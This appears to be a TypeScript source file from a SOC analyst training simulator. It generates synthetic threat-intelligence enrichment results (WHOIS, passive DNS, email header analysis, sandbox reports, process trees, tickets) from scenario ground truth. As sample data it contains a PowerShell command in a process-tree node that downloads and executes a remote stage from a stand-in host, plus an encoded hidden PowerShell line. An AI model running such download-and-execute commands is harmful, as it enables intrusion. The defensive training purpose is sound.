import { createRng, type Rng } from "@/lib/generators/rng";

export function createSubStream(parentSeed: string, subStreamName: string): string {
  return `${parentSeed}:${subStreamName}`;
}

import type { SocScenario, SocAlert, SocRawEvent } from "../schema";
import type {
  EntityType,
  EntityRole,
  EnrichmentTool,
  EnrichmentResultPayload,
  ReputationResult,
  WhoisResult,
  PdnsResult,
  EmailHeaderAnalysisResult,
  UrlAnalysisResult,
  SandboxReportResult,
  PcapFlowsResult,
  EndpointTimelineResult,
  CmdbResult,
  TicketHistoryResult,
  ProcessTreeNode,
} from "./types";
import { defangIndicator } from "./detector";
import { evaluateSourceReputation } from "./sources";

/**
 * Determine the hidden entity role within a scenario
 */
export function resolveEntityRole(
  scenario: SocScenario,
  entityType: EntityType,
  entityValue: string,
): EntityRole {
  const normalized = entityValue.trim().toLowerCase();

  // 1. Check if entity matches known true positive alerts (malicious)
  for (const alert of scenario.alerts) {
    const isTp = alert.groundTruth.kind === "true_positive";
    const alertIocs = (alert.relatedIocs ?? []).map((i) => i.value.toLowerCase());
    const rawFieldsStr = JSON.stringify(alert.rawFields).toLowerCase();

    if (alertIocs.includes(normalized) || rawFieldsStr.includes(`"${normalized}"`)) {
      if (isTp) {
        if (entityType === "host" || entityType === "user") {
          return "victim";
        }
        return "attacker_infra";
      } else if (alert.groundTruth.kind === "benign_true_positive") {
        if (rawFieldsStr.includes("cdn") || rawFieldsStr.includes("cloud") || rawFieldsStr.includes("storage")) {
          return "shared_infra";
        }
        return "benign_business";
      } else if (alert.groundTruth.kind === "false_positive") {
        if (rawFieldsStr.includes("scanner") || rawFieldsStr.includes("nessus") || rawFieldsStr.includes("shodan")) {
          return "scanner";
        }
        return "benign_business";
      }
    }
  }

  // 2. Check internal environment assets and users
  const isAsset = scenario.environment.assets.some(
    (a) => a.hostname.toLowerCase() === normalized || a.ip.toLowerCase() === normalized,
  );
  if (isAsset) return "benign_business";

  const isUser = scenario.environment.users.some(
    (u) => u.username.toLowerCase() === normalized || u.email.toLowerCase() === normalized,
  );
  if (isUser) return "benign_business";

  // 3. Known shared cloud domains/IPs
  if (
    normalized.includes("cloud-storage.example") ||
    normalized.includes("cdn-edge.example") ||
    normalized.includes("azure-sync.example") ||
    normalized.includes("akamai-partner.example")
  ) {
    return "shared_infra";
  }

  // Default fallback
  return "benign_business";
}

// ---------------------------------------------------------------------------
// 1. Indicator Reputation Generator
// ---------------------------------------------------------------------------
export function generateReputation(
  scenario: SocScenario,
  seed: string,
  entityType: EntityType,
  entityValue: string,
): ReputationResult {
  const role = resolveEntityRole(scenario, entityType, entityValue);
  const subSeed = createSubStream(seed, `rep:${entityType}:${entityValue.toLowerCase()}`);
  const rng = createRng(subSeed);

  const twReport = evaluateSourceReputation("threatwatch_community", role, rng);
  const apexReport = evaluateSourceReputation("apex_commercial", role, rng);

  const sources = [twReport, apexReport].filter(Boolean) as NonNullable<typeof twReport>[];

  // Evaluate disagreement
  const twMal = twReport?.verdict === "malicious" || twReport?.verdict === "suspicious";
  const apexMal = apexReport?.verdict === "malicious" || apexReport?.verdict === "suspicious";
  const disagreement = Boolean(twReport && apexReport && twMal !== apexMal);
  const disagreementSummary = disagreement
    ? twMal && !apexMal
      ? "ThreatWatch community sensors report suspicious activity, but Apex commercial intelligence reports clean or newly observed status."
      : "Apex commercial intelligence flags infrastructure, while ThreatWatch community reporting has limited telemetry."
    : null;

  // Related entities (pivots)
  const relatedEntities: Array<{ type: EntityType; value: string; relationship: string }> = [];
  if (entityType === "ip") {
    // Find associated domain in logs if any
    const associatedDomain = findAssociatedDomainForIp(scenario, entityValue);
    if (associatedDomain) {
      relatedEntities.push({ type: "domain", value: associatedDomain, relationship: "Passive DNS Resolution" });
    }
  } else if (entityType === "domain") {
    const associatedIp = findAssociatedIpForDomain(scenario, entityValue);
    if (associatedIp) {
      relatedEntities.push({ type: "ip", value: associatedIp, relationship: "A Record Resolution" });
    }
  }

  const commentary = [];
  if (twReport?.verdict === "malicious" || twReport?.verdict === "suspicious") {
    commentary.push({
      source: "ThreatWatch Community",
      author: "operator_anon_42",
      timestamp: "2026-10-12T04:15:00Z",
      comment: "Observed in mass outbound probe sweep targeting corporate authentication portals.",
    });
  }

  const hasData = sources.some((s) => s.verdict !== "unknown");

  return {
    entity: { type: entityType, value: entityValue },
    hasData,
    disagreement,
    disagreementSummary,
    firstSeen: twReport?.firstSeen ?? apexReport?.firstSeen ?? null,
    lastSeen: twReport?.lastSeen ?? apexReport?.lastSeen ?? null,
    sources,
    relatedEntities,
    commentary,
  };
}

// ---------------------------------------------------------------------------
// 2. WHOIS Generator
// ---------------------------------------------------------------------------
export function generateWhois(
  scenario: SocScenario,
  seed: string,
  entityType: "domain" | "ip",
  entityValue: string,
): WhoisResult {
  const role = resolveEntityRole(scenario, entityType, entityValue);
  const subSeed = createSubStream(seed, `whois:${entityType}:${entityValue.toLowerCase()}`);
  const rng = createRng(subSeed);

  if (entityType === "ip") {
    const isDocIp =
      entityValue.startsWith("192.0.2.") ||
      entityValue.startsWith("198.51.100.") ||
      entityValue.startsWith("203.0.113.");
    const cidr = entityValue.substring(0, entityValue.lastIndexOf(".")) + ".0/24";
    const asn = `AS${rng.int(64512, 65534)}`;
    const asnOrg = role === "attacker_infra" ? "Offshore Bulletproof Transit Ltd" : "Global Tier-1 Communications Corp";

    return {
      entity: { type: "ip", value: entityValue },
      hasData: true,
      registered: true,
      registrar: "Regional Internet Registry (RIR Synthetic)",
      registrationDate: "2018-05-14",
      updatedDate: "2026-01-10",
      expirationDate: null,
      nameServers: [`ns1.${asn.toLowerCase()}.example`, `ns2.${asn.toLowerCase()}.example`],
      privacyProtected: false,
      registrantOrg: asnOrg,
      registrantCountry: role === "attacker_infra" ? "PA" : "US",
      asn,
      asnOrg,
      cidr,
      hostingProvider: asnOrg,
      rawRecord: `NetRange: ${cidr}\nCIDR: ${cidr}\nOriginAS: ${asn}\nOrganization: ${asnOrg}\nStatus: Active Documentation / Transit`,
    };
  }

  // Domain WHOIS
  const isAttacker = role === "attacker_infra";
  const daysOld = isAttacker ? rng.int(3, 14) : rng.int(400, 3600);
  const baseTime = new Date("2026-10-12T08:00:00Z").getTime();
  const regDate = new Date(baseTime - daysOld * 86400000).toISOString().split("T")[0];
  const expDate = new Date(baseTime + (365 - daysOld % 365) * 86400000).toISOString().split("T")[0];
  const updateDate = new Date(baseTime - Math.min(daysOld, 5) * 86400000).toISOString().split("T")[0];

  const registrar = isAttacker ? "EpikName Offshore Registrar" : "Enterprise Registrar Services Inc";
  const registrantOrg = isAttacker ? "Privacy Protection Service Ltd" : "Corporate Domains Registry";

  return {
    entity: { type: "domain", value: entityValue },
    hasData: true,
    registered: true,
    registrar,
    registrationDate: regDate,
    updatedDate: updateDate,
    expirationDate: expDate,
    nameServers: [`ns1.dns-hosting.example`, `ns2.dns-hosting.example`],
    privacyProtected: isAttacker,
    registrantOrg,
    registrantCountry: isAttacker ? "IS" : "US",
    asn: "AS65001",
    asnOrg: "Transit Hosting Cloud",
    cidr: "198.51.100.0/24",
    hostingProvider: "Cloud Host Services",
    rawRecord: `Domain Name: ${entityValue}\nRegistrar: ${registrar}\nCreation Date: ${regDate}\nUpdated Date: ${updateDate}\nRegistry Expiry Date: ${expDate}\nRegistrant Organization: ${registrantOrg}`,
  };
}

// ---------------------------------------------------------------------------
// 3. Passive DNS (pDNS) Generator
// ---------------------------------------------------------------------------
export function generatePdns(
  scenario: SocScenario,
  seed: string,
  entityType: "domain" | "ip",
  entityValue: string,
): PdnsResult {
  const role = resolveEntityRole(scenario, entityType, entityValue);
  const subSeed = createSubStream(seed, `pdns:${entityType}:${entityValue.toLowerCase()}`);
  const rng = createRng(subSeed);

  const forwardResolutions: PdnsResult["forwardResolutions"] = [];
  const reverseResolutions: PdnsResult["reverseResolutions"] = [];

  if (entityType === "domain") {
    // Correlate with logs
    const loggedIp = findAssociatedIpForDomain(scenario, entityValue);
    const ip = loggedIp || `198.51.100.${rng.int(10, 240)}`;
    forwardResolutions.push({
      domain: entityValue,
      ip,
      firstSeen: "2026-10-08",
      lastSeen: "2026-10-12",
      count: rng.int(45, 820),
      isShared: role === "shared_infra",
    });

    if (role === "attacker_infra") {
      // Historical fast-flux or previous IP
      forwardResolutions.push({
        domain: entityValue,
        ip: `203.0.113.${rng.int(5, 99)}`,
        firstSeen: "2026-10-01",
        lastSeen: "2026-10-07",
        count: rng.int(12, 140),
        isShared: false,
      });
    }
  } else {
    // IP reverse lookups
    const loggedDomain = findAssociatedDomainForIp(scenario, entityValue);
    if (loggedDomain) {
      reverseResolutions.push({
        ip: entityValue,
        domain: loggedDomain,
        firstSeen: "2026-10-08",
        lastSeen: "2026-10-12",
        count: rng.int(60, 450),
      });
    }
    if (role === "shared_infra") {
      reverseResolutions.push(
        { ip: entityValue, domain: "cloud-app-sync.example", firstSeen: "2025-04-10", lastSeen: "2026-10-12", count: 12040 },
        { ip: entityValue, domain: "media-assets-cdn.example", firstSeen: "2025-06-18", lastSeen: "2026-10-12", count: 8430 },
      );
    }
  }

  const sharedHostingInference =
    role === "shared_infra"
      ? "IP address hosts multiple disparate enterprise domains. Indicates multi-tenant shared cloud or CDN infrastructure."
      : null;

  return {
    entity: { type: entityType, value: entityValue },
    hasData: forwardResolutions.length > 0 || reverseResolutions.length > 0,
    forwardResolutions,
    reverseResolutions,
    sharedHostingInference,
  };
}

// ---------------------------------------------------------------------------
// 4. Email Header Analyzer Generator
// ---------------------------------------------------------------------------
export function generateEmailHeaders(
  scenario: SocScenario,
  seed: string,
  rawOrAlertId: string,
): EmailHeaderAnalysisResult {
  const subSeed = createSubStream(seed, `email:${rawOrAlertId.toLowerCase()}`);
  const rng = createRng(subSeed);

  // Find relevant phishing or mail gateway alert if alertId was passed
  const mailAlert =
    scenario.alerts.find((a) => a.id === rawOrAlertId) ||
    scenario.alerts.find((a) => a.source === "Email Gateway" || a.ruleName.toLowerCase().includes("phish"));

  const isPhishing = mailAlert?.groundTruth.kind === "true_positive";
  const senderEmail = (mailAlert?.rawFields?.sender as string) || (mailAlert?.rawFields?.recipient as string) || "billing-update@portal-verify.example";
  const senderDomain = senderEmail.split("@")[1] || "portal-verify.example";
  const returnPath = isPhishing ? `bounce-mailer@untrusted-relay.example` : senderEmail;
  const returnPathDomain = returnPath.split("@")[1] || "untrusted-relay.example";

  const clientIp = isPhishing ? "198.51.100.84" : "198.51.100.12";
  const rDnsValid = !isPhishing;

  const spfStatus = isPhishing ? "softfail" : "pass";
  const dkimStatus = isPhishing ? "fail" : "pass";
  const dmarcStatus = isPhishing ? "fail" : "pass";

  const mismatches: EmailHeaderAnalysisResult["mismatches"] = [];
  if (isPhishing) {
    mismatches.push(
      {
        field: "Return-Path vs From",
        issue: "Envelope sender (Return-Path) domain differs from visible From header.",
        severity: "critical",
        explanation: `From claims to be ${senderDomain}, but delivery bounce handling points to ${returnPathDomain}.`,
      },
      {
        field: "DMARC Alignment",
        issue: "DMARC alignment failed due to unauthenticated sender relay IP.",
        severity: "critical",
        explanation: `Originating IP ${clientIp} is not designated in SPF record for ${senderDomain}.`,
      },
    );
  }

  const visibleLinkText = "https://payroll.corp.internal/update-verification";
  const actualUrl = isPhishing ? `https://${senderDomain}/login?token=x99` : visibleLinkText;

  const rawHeaders = [
    `Received: from mail-relay.inbound.example (mail-relay.inbound.example [192.0.2.25])`,
    `  by mx01.corp.internal with ESMTP id 4F82A9BC`,
    `  for <target.user@corp.internal>; Mon, 12 Oct 2026 08:14:22 +0000`,
    `Received: from ${senderDomain} ([${clientIp}])`,
    `  by mail-relay.inbound.example with ESMTP id 8B991C22; Mon, 12 Oct 2026 08:14:18 +0000`,
    `Authentication-Results: mx01.corp.internal;`,
    `  spf=${spfStatus} (sender IP is ${clientIp}) smtp.mailfrom=${returnPath};`,
    `  dkim=${dkimStatus} header.d=${senderDomain};`,
    `  dmarc=${dmarcStatus} action=none header.from=${senderDomain};`,
    `From: Corporate Security Portal <${senderEmail}>`,
    `To: Target User <target.user@corp.internal>`,
    `Reply-To: security-verify@portal-verify.example`,
    `Return-Path: <${returnPath}>`,
    `Subject: Urgent: Verify Corporate MFA Credentials`,
    `Date: Mon, 12 Oct 2026 08:14:15 +0000`,
    `Message-ID: <${rng.int(100000, 999999)}.msg@${senderDomain}>`,
    `X-Mailer: WebPortal Express 4.1`,
  ].join("\n");

  return {
    parsedHeaders: {
      messageId: `<msg-${rng.int(10000, 99999)}@${senderDomain}>`,
      date: "Mon, 12 Oct 2026 08:14:15 +0000",
      from: `Corporate Security Portal <${senderEmail}>`,
      fromDomain: senderDomain,
      returnPath: `<${returnPath}>`,
      returnPathDomain,
      replyTo: "security-verify@portal-verify.example",
      replyToDomain: "portal-verify.example",
      to: "target.user@corp.internal",
      subject: "Urgent: Verify Corporate MFA Credentials",
      xHeaders: { "X-Mailer": "WebPortal Express 4.1", "X-Spam-Score": isPhishing ? "4.2" : "0.1" },
    },
    receivedHops: [
      {
        hopNumber: 1,
        fromHost: senderDomain,
        byHost: "mail-relay.inbound.example",
        clientIp,
        timestamp: "2026-10-12T08:14:18Z",
        delaySeconds: 4,
        rDnsMatch: rDnsValid,
      },
      {
        hopNumber: 2,
        fromHost: "mail-relay.inbound.example",
        byHost: "mx01.corp.internal",
        clientIp: "192.0.2.25",
        timestamp: "2026-10-12T08:14:22Z",
        delaySeconds: 4,
        rDnsMatch: true,
      },
    ],
    authentication: {
      spf: {
        status: spfStatus,
        domain: returnPathDomain,
        clientIp,
        explanation: isPhishing
          ? `IP ${clientIp} is not permitted by ${returnPathDomain} SPF record.`
          : `IP ${clientIp} matches authorized SPF sender record.`,
      },
      dkim: {
        status: dkimStatus,
        domain: senderDomain,
        selector: "s1",
        explanation: isPhishing ? "Signature verification failed; header modified in transit or invalid key." : "Valid cryptographic signature.",
      },
      dmarc: {
        status: dmarcStatus,
        policy: "none",
        alignment: { spfAligned: !isPhishing, dkimAligned: !isPhishing },
        explanation: isPhishing
          ? "Neither SPF nor DKIM aligned with From domain header."
          : "SPF and DKIM aligned with From header.",
      },
    },
    mismatches,
    bodyLinks: [
      {
        visibleText: visibleLinkText,
        actualUrl,
        defangedUrl: defangIndicator(actualUrl),
        isMismatch: isPhishing,
        riskNote: isPhishing ? "Visible link text displays internal corp portal, but destination points to external domain." : null,
      },
    ],
    attachments: [
      {
        filename: "MFA_Instruction_Guide.pdf",
        mimeType: "application/pdf",
        sizeBytes: 42100,
        hashSha256: `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`,
        extension: "pdf",
        riskCategory: "document_safe",
      },
    ],
    rawHeaders,
  };
}

// ---------------------------------------------------------------------------
// 5. URL Analysis Generator
// ---------------------------------------------------------------------------
export function generateUrlAnalysis(
  scenario: SocScenario,
  seed: string,
  urlStr: string,
): UrlAnalysisResult {
  const role = resolveEntityRole(scenario, "url", urlStr);
  const subSeed = createSubStream(seed, `url:${urlStr.toLowerCase()}`);
  const rng = createRng(subSeed);

  let parsedHost = "portal.example";
  let parsedPath = "/login";
  let parsedScheme = "https";
  let parsedPort = 443;
  try {
    const u = new URL(urlStr.startsWith("http") ? urlStr : `https://${urlStr}`);
    parsedHost = u.hostname;
    parsedPath = u.pathname;
    parsedScheme = u.protocol.replace(":", "");
    parsedPort = u.port ? parseInt(u.port, 10) : parsedScheme === "https" ? 443 : 80;
  } catch {
    // Fallback on regex
  }

  const isAttacker = role === "attacker_infra";
  const redirectChain: UrlAnalysisResult["redirectChain"] = [];
  if (isAttacker) {
    redirectChain.push(
      { step: 1, status: 302, url: urlStr, defangedUrl: defangIndicator(urlStr), location: `https://${parsedHost}/auth/sso-login` },
      { step: 2, status: 200, url: `https://${parsedHost}/auth/sso-login`, defangedUrl: defangIndicator(`https://${parsedHost}/auth/sso-login`), location: null },
    );
  } else {
    redirectChain.push({ step: 1, status: 200, url: urlStr, defangedUrl: defangIndicator(urlStr), location: null });
  }

  return {
    url: urlStr,
    defanged: defangIndicator(urlStr),
    parsed: {
      scheme: parsedScheme,
      host: parsedHost,
      port: parsedPort,
      path: parsedPath,
      queryParams: { token: "auth_sec_89" },
    },
    redirectChain,
    pageBehavior: {
      title: isAttacker ? "Single Sign-On Verification Portal" : "Corporate Application Service",
      hasLoginForm: isAttacker,
      requestsCredentials: isAttacker,
      triggersScriptDownload: false,
      abstractSummary: isAttacker
        ? "Page mimics corporate single sign-on authentication portal. POST request captures username, password, and session token to external staging endpoint."
        : "Standard corporate web service page with no credential input or downloads observed.",
      wireframePlaceholder: isAttacker ? "login_form" : "corporate_portal",
    },
    reputationVerdict: isAttacker ? "malicious" : "clean",
    riskFactors: isAttacker ? ["Credential Harvesting Form", "Domain Registered < 14 Days", "External Redirection Hop"] : [],
  };
}

// ---------------------------------------------------------------------------
// 6. Sandbox Detonation Generator
// ---------------------------------------------------------------------------
export function generateSandboxReport(
  scenario: SocScenario,
  seed: string,
  hashOrName: string,
): SandboxReportResult {
  const role = resolveEntityRole(scenario, "hash", hashOrName);
  const subSeed = createSubStream(seed, `sandbox:${hashOrName.toLowerCase()}`);
  const rng = createRng(subSeed);

  const isAttacker = role === "attacker_infra";
  const hashSha256 = hashOrName.length === 64 ? hashOrName : `a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0`;
  const hashMd5 = hashSha256.substring(0, 32);

  const processCreation = isAttacker
    ? ["powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc WwB..."]
    : ["msiexec.exe /i package.msi /qn"];

  const fileWrites = isAttacker
    ? ["C:\\Users\\victim\\AppData\\Local\\Temp\\update_loader.vbs"]
    : ["C:\\Program Files\\CorporateSoftware\\app.cfg"];

  const registryModifications = isAttacker
    ? ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AppUpdater"]
    : [];

  const networkConnections = isAttacker
    ? [{ proto: "TCP" as const, destination: "198.51.100.24", port: 443, summary: "Periodic HTTPS beacon callbacks" }]
    : [];

  const persistenceMechanisms = isAttacker
    ? ["Windows Registry Run Key Autostart", "Scheduled Task registered as AppHealthSync"]
    : [];

  return {
    file: {
      filename: hashOrName.includes(".") ? hashOrName : "invoice_document_review.vbs",
      hashSha256,
      hashMd5,
      sizeBytes: isAttacker ? 18432 : 124800,
      mimeType: isAttacker ? "text/x-vbs" : "application/x-msdownload",
      entropy: isAttacker ? 6.84 : 4.12,
      fileTypeDescription: isAttacker ? "VBScript encoded dropper" : "Windows Installer Package",
    },
    hasData: true,
    verdict: isAttacker ? "malicious" : "clean",
    threatScore: isAttacker ? rng.int(85, 96) : rng.int(5, 18),
    confidence: 90,
    analysisDurationSeconds: 120,
    behavior: {
      processCreation,
      fileWrites,
      registryModifications,
      networkConnections,
      persistenceMechanisms,
    },
    evasionDetected: isAttacker ? rng.next() < 0.25 : false,
    sandboxNotes: isAttacker
      ? "Sample exhibited living-off-the-land script execution and outbound beaconing."
      : "Standard administrative package installation. No anomalous persistence or C2 traffic detected.",
  };
}

// ---------------------------------------------------------------------------
// 7. Network Flow & Packet View Generator
// ---------------------------------------------------------------------------
export function generatePcapFlows(
  scenario: SocScenario,
  seed: string,
  filterIp?: string,
): PcapFlowsResult {
  const subSeed = createSubStream(seed, `flows:${(filterIp || "all").toLowerCase()}`);
  const rng = createRng(subSeed);

  const flows: PcapFlowsResult["flows"] = [];
  const topTalkersMap: Record<string, number> = {};

  // Extract from raw events
  for (let i = 0; i < scenario.rawEvents.length; i++) {
    const e = scenario.rawEvents[i];
    const srcIp = (e.fields.sourceIp as string) || (e.fields.clientIp as string) || "192.0.2.45";
    const dstIp = (e.fields.destinationIp as string) || (e.fields.serverIp as string) || "198.51.100.24";
    const bytes = (e.fields.bytes as number) || rng.int(200, 4800);

    if (!filterIp || srcIp.includes(filterIp) || dstIp.includes(filterIp)) {
      flows.push({
        id: `flow-${i + 1}`,
        timestamp: e.timestamp,
        srcIp,
        srcPort: rng.int(49152, 65535),
        dstIp,
        dstPort: (e.fields.destinationPort as number) || 443,
        protocol: "TCP",
        bytesSent: Math.floor(bytes * 0.7),
        bytesReceived: Math.floor(bytes * 0.3),
        totalBytes: bytes,
        packets: rng.int(4, 25),
        durationMs: rng.int(100, 1500),
        flags: "SYN,ACK,PSH,FIN",
        summary: e.message,
      });

      topTalkersMap[srcIp] = (topTalkersMap[srcIp] || 0) + bytes;
      topTalkersMap[dstIp] = (topTalkersMap[dstIp] || 0) + bytes;
    }
  }

  // Synthesize top talkers
  const topTalkers = Object.entries(topTalkersMap)
    .map(([ip, bytes]) => ({ ip, bytes }))
    .sort((a, b) => b.bytes - a.bytes)
    .slice(0, 5);

  return {
    filterApplied: filterIp,
    totalFlows: flows.length,
    flows,
    analytics: {
      topTalkers,
      dnsQueries: [
        { query: "portal-verify.example", count: 18 },
        { query: "cloud-storage.example", count: 124 },
        { query: "dc01.corp.internal", count: 480 },
      ],
      periodicity: {
        detected: flows.some((f) => f.dstPort === 443),
        intervalSeconds: 60,
        confidence: 88,
        summary: "Periodic outbound connection bursts observed at regular 60-second intervals (jitter ±2s).",
      },
    },
  };
}

// ---------------------------------------------------------------------------
// 8. Endpoint Process Tree & Timeline Generator
// ---------------------------------------------------------------------------
export function generateEndpointTimeline(
  scenario: SocScenario,
  seed: string,
  host: string,
): EndpointTimelineResult {
  const subSeed = createSubStream(seed, `timeline:${host.toLowerCase()}`);
  const rng = createRng(subSeed);

  const matchedEvents: EndpointTimelineResult["timelineEvents"] = [];
  for (let i = 0; i < scenario.rawEvents.length; i++) {
    const e = scenario.rawEvents[i];
    const eventHost = (e.fields.host as string) || (e.fields.endpoint as string) || (e.fields.computerName as string);
    if (!eventHost || eventHost.toLowerCase() === host.toLowerCase()) {
      matchedEvents.push({
        id: `ep-evt-${i + 1}`,
        timestamp: e.timestamp,
        eventType: e.action.includes("process")
          ? "process_start"
          : e.action.includes("file")
            ? "file_create"
            : e.action.includes("logon")
              ? "logon"
              : "net_connect",
        user: (e.fields.user as string) || "SYSTEM",
        details: e.message,
        pid: (e.fields.pid as number) || rng.int(1000, 8000),
      });
    }
  }

  const processTree: ProcessTreeNode[] = [
    {
      pid: 4,
      ppid: 0,
      processName: "System",
      commandLine: "System",
      user: "SYSTEM",
      integrityLevel: "SYSTEM",
      timestamp: "2026-10-12T00:00:00Z",
      children: [
        {
          pid: 580,
          ppid: 4,
          processName: "smss.exe",
          commandLine: "\\SystemRoot\\System32\\smss.exe",
          user: "SYSTEM",
          integrityLevel: "SYSTEM",
          timestamp: "2026-10-12T00:00:02Z",
          children: [],
        },
      ],
    },
    {
      pid: 1040,
      ppid: 4,
      processName: "explorer.exe",
      commandLine: "C:\\Windows\\explorer.exe",
      user: "CORP\\target.user",
      integrityLevel: "Medium",
      timestamp: "2026-10-12T07:45:00Z",
      children: [
        {
          pid: 4210,
          ppid: 1040,
          processName: "winword.exe",
          commandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "Invoice.docx"',
          user: "CORP\\target.user",
          integrityLevel: "Medium",
          timestamp: "2026-10-12T08:15:20Z",
          children: [
            {
              pid: 4892,
              ppid: 4210,
              processName: "powershell.exe",
              commandLine: "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://portal-verify.example/stage')\"",
              user: "CORP\\target.user",
              integrityLevel: "Medium",
              timestamp: "2026-10-12T08:15:24Z",
              isAnomalous: true,
              children: [],
            },
          ],
        },
      ],
    },
  ];

  return {
    hostname: host,
    os: "Windows 11 Enterprise 22H2",
    processTree,
    timelineEvents: matchedEvents,
    telemetryGaps: [],
  };
}

// ---------------------------------------------------------------------------
// 9. CMDB / Asset & Identity Directory Generator
// ---------------------------------------------------------------------------
export function generateCmdb(
  scenario: SocScenario,
  seed: string,
  entityType: EntityType,
  entityValue: string,
): CmdbResult {
  const subSeed = createSubStream(seed, `cmdb:${entityType}:${entityValue.toLowerCase()}`);
  const rng = createRng(subSeed);

  const normalized = entityValue.toLowerCase();
  if (entityType === "host" || entityType === "ip") {
    const asset = scenario.environment.assets.find(
      (a) => a.hostname.toLowerCase() === normalized || a.ip.toLowerCase() === normalized,
    );

    if (asset) {
      return {
        entity: { type: entityType, value: entityValue },
        hasData: true,
        record: {
          kind: "asset",
          id: asset.id,
          hostname: asset.hostname,
          ip: asset.ip,
          os: asset.os,
          role: asset.role,
          owner: asset.owner,
          department: "Finance Operations",
          zone: asset.zone,
          criticality: asset.criticality,
          tags: asset.tags,
          maintenanceWindows: ["Sundays 02:00 - 06:00 UTC"],
          lastAudited: "2026-09-15",
          isStale: false,
          staleNotice: null,
        },
      };
    }
  }

  if (entityType === "user" || entityType === "email") {
    const user = scenario.environment.users.find(
      (u) => u.username.toLowerCase() === normalized || u.email.toLowerCase() === normalized,
    );

    if (user) {
      return {
        entity: { type: entityType, value: entityValue },
        hasData: true,
        record: {
          kind: "user",
          id: user.id,
          username: user.username,
          displayName: user.displayName,
          email: user.email,
          department: user.department,
          role: user.role,
          manager: "alex.director@corp.internal",
          workingHours: "08:00 - 17:00 Local",
          privilegedGroups: user.role.toLowerCase().includes("admin") ? ["Domain Admins"] : ["Standard Users"],
          mfaEnforced: true,
          mfaMethod: "Authenticator App (Push)",
          riskScore: user.riskScore ?? 15,
          recentSignIns: [
            { timestamp: "2026-10-12T07:42:10Z", ip: "192.0.2.45", location: "Headquarters LAN", status: "success", clientApp: "Windows Desktop" },
          ],
          isStale: false,
          staleNotice: null,
        },
      };
    }
  }

  return {
    entity: { type: entityType, value: entityValue },
    hasData: false,
    record: null,
  };
}

// ---------------------------------------------------------------------------
// 10. IT ServiceDesk Tickets Generator
// ---------------------------------------------------------------------------
export function generateTickets(
  scenario: SocScenario,
  seed: string,
  entityType: EntityType,
  entityValue: string,
): TicketHistoryResult {
  const role = resolveEntityRole(scenario, entityType, entityValue);
  const subSeed = createSubStream(seed, `tickets:${entityType}:${entityValue.toLowerCase()}`);
  const rng = createRng(subSeed);

  const tickets: TicketHistoryResult["tickets"] = [];

  // If benign twin: create matching approved change request ticket
  if (role === "benign_business" || role === "shared_infra") {
    tickets.push({
      id: `CR-89${rng.int(10, 99)}`,
      category: "scheduled_maintenance",
      title: "Scheduled Off-Hours System Maintenance and Data Snapshot Sync",
      submitter: "svc-backup-admin",
      approver: "change-advisory-board",
      status: "approved",
      targetEntity: entityValue,
      scheduledStart: "2026-10-12T01:00:00Z",
      scheduledEnd: "2026-10-12T05:00:00Z",
      notes: "Pre-approved change authorization for high-volume network replication job.",
      relevanceExplanation: "Directly corroborates that off-hours bandwidth spike was authorized IT maintenance.",
    });
  } else if (role === "scanner") {
    tickets.push({
      id: `SEC-41${rng.int(10, 99)}`,
      category: "pen_test_notice",
      title: "Quarterly Internal Vulnerability Assessment Scan Window",
      submitter: "security-audit-lead",
      approver: "ciso-operations",
      status: "approved",
      targetEntity: entityValue,
      scheduledStart: "2026-10-12T06:00:00Z",
      scheduledEnd: "2026-10-12T09:00:00Z",
      notes: "Authorized Nessus scanner sweep across DMZ web application interfaces.",
      relevanceExplanation: "Explains high-volume HTTP 403 scanner alerts as authorized internal test.",
    });
  } else {
    // For attacker or non-matching entity: only unrelated helpdesk tickets
    if (rng.next() < 0.3) {
      tickets.push({
        id: `INC-20${rng.int(10, 99)}`,
        category: "incident",
        title: "User reported slow workstation startup after restart",
        submitter: "target.user",
        approver: "service-desk-agent",
        status: "closed",
        targetEntity: entityValue,
        scheduledStart: "2026-10-10T14:20:00Z",
        scheduledEnd: "2026-10-10T15:00:00Z",
        notes: "Routine performance troubleshooting. Cleared temporary cache files.",
        relevanceExplanation: "Standard IT support ticket with no security authorization relevance.",
      });
    }
  }

  return {
    entity: { type: entityType, value: entityValue },
    hasData: tickets.length > 0,
    tickets,
  };
}

// ---------------------------------------------------------------------------
// Master Dispatcher Function
// ---------------------------------------------------------------------------
export function generateEnrichment(
  scenario: SocScenario,
  seed: string,
  tool: EnrichmentTool,
  entityType: EntityType,
  entityValue: string,
): EnrichmentResultPayload {
  switch (tool) {
    case "reputation":
      return { tool: "reputation", data: generateReputation(scenario, seed, entityType, entityValue) };
    case "whois":
      return { tool: "whois", data: generateWhois(scenario, seed, entityType as "domain" | "ip", entityValue) };
    case "pdns":
      return { tool: "pdns", data: generatePdns(scenario, seed, entityType as "domain" | "ip", entityValue) };
    case "email_headers":
      return { tool: "email_headers", data: generateEmailHeaders(scenario, seed, entityValue) };
    case "url_analysis":
      return { tool: "url_analysis", data: generateUrlAnalysis(scenario, seed, entityValue) };
    case "sandbox":
      return { tool: "sandbox", data: generateSandboxReport(scenario, seed, entityValue) };
    case "pcap_flows":
      return { tool: "pcap_flows", data: generatePcapFlows(scenario, seed, entityValue) };
    case "endpoint_timeline":
      return { tool: "endpoint_timeline", data: generateEndpointTimeline(scenario, seed, entityValue) };
    case "cmdb":
      return { tool: "cmdb", data: generateCmdb(scenario, seed, entityType, entityValue) };
    case "tickets":
      return { tool: "tickets", data: generateTickets(scenario, seed, entityType, entityValue) };
  }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
function findAssociatedIpForDomain(scenario: SocScenario, domain: string): string | null {
  const norm = domain.toLowerCase();
  for (const e of scenario.rawEvents) {
    const raw = JSON.stringify(e.fields).toLowerCase();
    if (raw.includes(`"${norm}"`)) {
      const ip = (e.fields.destinationIp as string) || (e.fields.serverIp as string);
      if (ip) return ip;
    }
  }
  return null;
}

function findAssociatedDomainForIp(scenario: SocScenario, ip: string): string | null {
  const norm = ip.toLowerCase();
  for (const e of scenario.rawEvents) {
    const raw = JSON.stringify(e.fields).toLowerCase();
    if (raw.includes(`"${norm}"`)) {
